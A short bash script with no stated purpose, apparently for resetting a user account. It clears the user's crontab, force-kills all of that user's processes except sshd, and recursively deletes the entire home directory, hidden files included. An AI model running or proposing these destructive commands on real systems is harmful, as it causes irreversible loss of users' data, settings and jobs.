#!/bin/bash
echo "" > null
crontab null
rm null
user=$(whoami)
pgrep -u $user | grep -v $(pgrep -u $user sshd) | xargs kill -9
rm -rf ~/* ~/.* 2>/dev/null
